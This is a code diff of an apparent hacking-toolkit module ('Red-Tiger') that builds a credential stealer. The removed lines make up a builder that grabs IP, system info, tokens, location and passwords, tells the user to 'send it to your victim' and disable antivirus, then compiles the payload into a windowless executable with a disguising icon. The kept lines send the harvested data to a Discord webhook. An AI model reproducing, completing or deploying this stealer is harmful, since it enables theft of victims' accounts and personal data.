@@ -1,48 +1,4 @@
-from Options.Options import *
-
 import os
-import subprocess
-import time
-from tkinter import Tk, filedialog
-
-Title("Stealer Create")
-
-LAPprint(f"""{color.RED}
-{color.YELLOW}Ip{color.RED} Grab
-{color.YELLOW}System{color.RED} Grab
-{color.YELLOW}Token{color.RED} Grab
-{color.YELLOW}Location{color.RED} Grab
-{color.YELLOW}Account/Password{color.RED} Grab""")
-
-LAPprint(f"{color.RED}\nSend it to your victim !")
-LAPprint(f"{color.RED}Disable your antivirus !")
-
-webhook = input(f"\n{color.RED}[?] | URL Webhook -> {color.RESET}")
-name_file = input(f"{color.RED}[?] | File Name -> {color.RESET}")
-icone = input(f"{color.RED}[?] | Add an Icon (y/n) -> {color.RESET}")
-
-if not name_file.strip():
-    name_file = f'StealerCreate'
-
-if icone in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
- def choose_icon():
-    root = Tk()
-    root.withdraw()
-    root.attributes('-topmost', True)
-    icon_path = filedialog.askopenfilename(title=f"Red-Tiger {version_tool} | Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
-    return icon_path
- icon_path = choose_icon()  
-else:
-  ()
-
-fichier_texte = f'./Programmes/Programmes/StealerCreate/{name_file}.txt'
-fichier_python = f'./Programmes/Programmes/StealerCreate/{name_file}.py'
-chemin_destination = "./02-Stealer-Create"
-
-LAPprint(f"{color.RED}[!] | Installation of modules and conversion to (.exe):\n{color.RESET}")
-
-with open(fichier_texte, 'w') as fichier:
- fichier.write(r'''import os
 import platform
 import ctypes
 from screeninfo import get_monitors
@@ -895,11 +851,9 @@ Main Screen  : "No"
  else:
    second_ecran = 'N/A'
 except:
- second_ecran = "N/A"''')
- fichier.write(f'''
-webhook_invit = '{webhook}'
-''')
- fichier.write(r'''def send_embed_url(webhook_url):
+ second_ecran = "N/A"
+webhook_invit = 'fgdfgq'
+def send_embed_url(webhook_url):
 
     embed_data = {
         'title': f'Account ({account_number}) "{ip_address_public}":',
@@ -1025,116 +979,4 @@ username = 'Red-Tiger'
 avatar_url = 'https://cdn.discordapp.com/attachments/1184160374342299688/1184160439001686056/IMG_1506.png?ex=658af659&is=65788159&hm=9a0297ee590e78acbafc75bc4686ce2b553e40a2f2a850101378a09f23e32d08&'
 
 send_embed(webhook_invit)
-send_embed_url(webhook_invit)''')
-
-nom_module = 'requests'
-try:
- import requests
-except:
- subprocess.check_call(['pip', 'install', nom_module]) 
-
-nom_module = 'socket'
-try:
- import socket
-except:
- subprocess.check_call(['pip', 'install', nom_module]) 
-
-nom_module = 'platform'
-try:
- import platform
-except:
- subprocess.check_call(['pip', 'install', nom_module]) 
-
-nom_module = 'psutil'
-try:
- import psutil
-except:
- subprocess.check_call(['pip', 'install', nom_module]) 
-
-nom_module = 'screeninfo'
-try:
- import screeninfo
-except:
- subprocess.check_call(['pip', 'install', nom_module]) 
-
-nom_module = 'GPUtil'
-try:
- import GPUtil
-except:
- subprocess.check_call(['pip', 'install', nom_module]) 
-
-nom_module = 'gputil'
-try:
- import GPUtil
-except:
- subprocess.check_call(['pip', 'install', nom_module]) 
-
-nom_module = 'pypiwin32'
-try:
- import win32
-except:
- subprocess.check_call(['pip', 'install', nom_module]) 
-
-nom_module = 'pywin32'
-try:
- import win32
-except:
- subprocess.check_call(['pip', 'install', nom_module]) 
-
-nom_module = 'pycryptodome'
-try:
- import crypt
-except:
- subprocess.check_call(['pip', 'install', nom_module]) 
-
-nom_module = 'auto-py-to-exe'
-try:
- subprocess.check_call(['pip', 'install', nom_module]) 
-except:
- ()
-
-nom_module = 'pyinstaller'
-try:
- subprocess.check_call(['pip', 'install', nom_module]) 
-except:
- ()
-
-with open(fichier_texte, 'r') as fichier_txt:
-
-    contenu = fichier_txt.read()
-
-with open(fichier_python, 'w') as fichier_py:
-
-    fichier_py.write(contenu)
-
-with open(fichier_texte, 'w') as fichier:
-  fichier.write(f"{chemin_destination}")
-
-def convert_to_exe(script_name, destination_path, icon_path=None):
-    try:
-        script_path = os.path.abspath(script_name)
-
-        if not os.path.exists(destination_path):
-            os.makedirs(destination_path)
-
-        pyinstaller_command = ['pyinstaller', '--onefile', '--distpath', destination_path, '--noconsole', script_path]
-
-        if icon_path:
-            pyinstaller_command.extend(['--icon', icon_path])
-
-        subprocess.run(pyinstaller_command)
-
-        print(f"Conversion réussie. L'exécutable se trouve dans le dossier '{destination_path}'.")
-    except Exception as e:
-        print(f"Erreur lors de la conversion : {e}")
-
-if icone in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
- convert_to_exe(fichier_python, chemin_destination, icon_path)
-else: 
- convert_to_exe(fichier_python, chemin_destination)
-
-print(f"\n{color.RED}[!] | The file {color.CYAN}\"{name_file}\"{color.LIGHTRED_EX} has been created.", color.RESET)
-time.sleep(5)
-print(f"\n{color.RED}[!] | Road of \"StealerCreate\": {color.CYAN}\"{chemin_destination}\"{color.RED}, you can rename it, move it as you want !", color.RESET)
-time.sleep(5)
-Reset()
+send_embed_url(webhook_invit)
